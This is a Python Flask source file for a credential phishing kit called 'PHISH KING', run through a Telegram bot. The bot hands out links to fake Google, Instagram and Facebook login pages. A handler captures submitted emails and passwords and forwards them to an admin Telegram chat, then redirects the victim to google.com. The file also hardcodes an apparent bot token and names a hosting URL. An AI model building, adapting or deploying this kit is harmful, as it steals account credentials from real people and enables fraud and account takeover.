from flask import Flask, request
import os
import requests
import threading
import time
import json

app = Flask(__name__)

BOT_TOKEN = "8232409100:AAExUp0yXjQzN7js3bQriSKq5MiOClU3BeU"
ADMIN_CHAT_ID = os.getenv('ADMIN_CHAT_ID', '6593129349')  # YE SET KARNA ZAROOR!
PHISHING_DATA = []
running = True
last_update_id = 0

def send_msg(chat_id, text, reply_markup=None):
    data = {'chat_id': chat_id, 'text': text, 'parse_mode': 'HTML'}
    if reply_markup:
        data['reply_markup'] = json.dumps(reply_markup)
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data=data, timeout=10)
    except:
        pass

def answer_callback(query_id):
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery", 
                     data={'callback_query_id': query_id}, timeout=5)
    except:
        pass

def bot_loop():
    global last_update_id
    while running:
        try:
            resp = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates", 
                              params={'offset': last_update_id + 1, 'timeout': 30}).json()
            if resp['ok']:
                for update in resp['result']:
                    last_update_id = update['update_id']
                    
                    # MESSAGE
                    if 'message' in update:
                        msg = update['message']
                        cid = msg['chat']['id']
                        txt = msg.get('text', '').lower()
                        uid = str(msg['from']['id'])
                        
                        if '/start' in txt:
                            markup = {"inline_keyboard": [
                                [{"text": "📧 GMAIL", "callback_data": f"gmail_{uid}"}],
                                [{"text": "📸 INSTAGRAM", "callback_data": f"insta_{uid}"}],
                                [{"text": "📘 FACEBOOK", "callback_data": f"fb_{uid}"}],
                                [{"text": "👻 SNAPCHAT", "callback_data": f"snap_{uid}"}],
                                [{"text": "💬 DISCORD", "callback_data": f"discord_{uid}"}],
                                [{"text": "🎵 TIKTOK", "callback_data": f"tiktok_{uid}"}],
                                [{"text": "🔐 MICROSOFT", "callback_data": f"ms_{uid}"}]
                            ]}
                            send_msg(cid, f"🎉 <b>PHISH KING 👑</b>\n\n👇 <b>Select Service</b>", markup)
                        
                        if txt == '/data' and str(cid) == ADMIN_CHAT_ID:
                            if PHISHING_DATA:
                                hits = "\n".join([f"{d['service']}\n📧 <code>{d['email']}</code>\n🔑 <code>{d['pass']}</code>\n" for d in PHISHING_DATA[-15:]])
                                send_msg(cid, f"<b>🎣 {len(PHINGING_DATA)} HITS:</b>\n\n{hits}")
                            else:
                                send_msg(cid, "📭 No data yet")
                    
                    # CALLBACK
                    if 'callback_query' in update:
                        query = update['callback_query']
                        query_id = query['id']
                        cid = query['from']['id']
                        data = query['data']
                        
                        answer_callback(query_id)
                        service, uid = data.split('_', 1)
                        url = f"https://myphish.onrender.com/phish/{service}/{uid}"
                        send_msg(cid, f"✅ <b>{service.upper()} LIVE!</b>\n\n🔗 <code>{url}</code>\n📱 Send Now!")
                        
        except:
            pass
        time.sleep(1)

@app.route('/')
def home():
    return "<h1>🎣 PHISH KING - All Live!</h1>"

@app.route('/phish/<service>/<int:user_id>')
def phish(service, user_id):
    if service == 'gmail':
        return '''
<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width">
<title>Sign in - Google Accounts</title>
<style>
body{{background:#fff;font-family:Roboto,sans-serif}}.login-box{{max-width:396px;margin:72px auto;padding:48px 40px;background:#fff;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}}h1{{font-size:24px;margin-bottom:24px}}input{{width:100%;padding:16px;margin:8px 0;border:1px solid #dadce0;border-radius:4px;box-sizing:border-box;font-size:16px}}input:focus{{border-color:#4285f4;box-shadow:0 0 0 1px #4285f4}}.btn{{width:100%;padding:12px;background:#4285f4;color:#fff;border:none;border-radius:4px;font-size:14px;cursor:pointer;font-weight:500}}.btn:hover{{background:#3367d6}}
</style></head>
<body>
<div class="login-box">
<h1>Sign in</h1>
<p>Use your Google Account</p>
<form method="POST">
<input name="email" placeholder="Email or phone" type="email" required>
<input name="password" placeholder="Password" type="password" required>
<button class="btn">Next</button>
</form>
</div>
</body></html>'''
    
    elif service == 'insta':
        return '''
<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width">
<title>Instagram</title>
<style>
body{{background:#fafafa;font-family:-apple-system,system-ui,sans-serif;margin:0;padding:40px 20px}}.form{{max-width:350px;margin:0 auto;background:#fff;border:1px solid #dbdbdb;border-radius:1px;padding:40px 40px 20px}}.logo{{height:51px;background:#833ab4;border-radius:5px;margin:0 auto 30px 0;width:175px}}.input{{width:100%;border:1px solid #efefef;border-radius:3px;background:#fafafa;padding:9px 0 7px 8px;margin-bottom:6px;font-size:14px;box-sizing:border-box}}.login-btn{{width:100%;background:#0095f6;border:none;border-radius:4px;color:#fff;font-weight:600;padding:7px;font-size:14px;cursor:pointer;margin:8px 0}}
</style></head>
<body>
<div class="form">
<div class="logo"></div>
<form method="POST">
<input class="input" name="email" placeholder="Phone number, username, or email" required>
<input class="input" name="password" type="password" placeholder="Password" required>
<button class="login-btn">Log in</button>
</form>
</div>
</body></html>'''
    
    elif service == 'fb':
        return '''
<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width">
<title>Facebook</title>
<style>
body{{background:#f0f2f5;font-family:Helvetica,Arial,sans-serif;margin:0;padding:20px}}.card{{background:#fff;max-width:400px;margin:0 auto;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);padding:20px;overflow:hidden}}.logo{{height:100px;background:#1877f2;margin:-20px -20px 20px;padding:20px 20px 0;text-align:center}}.input{{width:100%;border:1px solid #ddd;border-radius:5px;padding:12px;margin:8px 0;font-size:16px;box-sizing:border-box}}.btn{{width:100%;background:#1877f2;color:#fff;border:none;border-radius:6px;padding:12px;font-size:18px;font-weight:bold;cursor:pointer;margin:8px 0}}
</style></head>
<body>
<div class="card">
<div class="logo">facebook</div>
<form method="POST">
<input class="input" name="email" placeholder="Email or phone number" required>
<input class="input" name="password" type="password" placeholder="Password" required>
<button class="btn">Log In</button>
</form>
</div>
</body></html>'''
    
    else:
        return '''
<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width">
<title>Login</title>
<style>body{{background:linear-gradient(135deg,#667eea,#764ba2);color:#333;font-family:Arial;padding:40px;margin:0;display:flex;align-items:center;justify-content:center;min-height:100vh}}.box{{background:#fff;border-radius:20px;padding:40px;max-width:380px;width:100%;box-shadow:0 20px 40px rgba(0,0,0,0.2);text-align:center}}.input{{width:100%;padding:16px;margin:10px 0;border:2px solid #ddd;border-radius:12px;box-sizing:border-box;font-size:16px}}.btn{{width:100%;padding:16px;background:#667eea;color:white;border:none;border-radius:12px;font-size:18px;cursor:pointer}}</style></head>
<body><div class="box"><h1>🔐 Login</h1><form method="POST"><input name="email" placeholder="Email" required><input name="password" type="password" placeholder="Password" required><button class="btn">Login</button></form></div></body></html>'''

@app.route('/phish/<service>/<int:user_id>', methods=['POST'])
def capture(service, user_id):
    data = {
        'email': request.form.get('email', ''),
        'pass': request.form.get('password', ''),
        'service': service.upper()
    }
    PHISHING_DATA.append(data)
    
    # INSTANT SEND TO ADMIN
    if ADMIN_CHAT_ID:
        try:
            send_msg(int(ADMIN_CHAT_ID), f"🎣 <b>{data['service']} HIT!</b>\n\n"
                                       f"📧 <code>{data['email']}</code>\n"
                                       f"🔑 <code>{data['pass']}</code>\n"
                                       f"🆔 User: {user_id}")
        except:
            pass
    
    return '''
<!DOCTYPE html>
<html><body style="background:#28a745;color:white;font-family:Arial;text-align:center;padding:100px;font-size:20px;">
<h1>✅ Success!</h1>
<p>Redirecting to service...</p>
<script>setTimeout(function(){{window.location.href="https://www.google.com";}}, 2000);</script>
</body></html>'''

if __name__ == '__main__':
    threading.Thread(target=bot_loop, daemon=True).start()
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
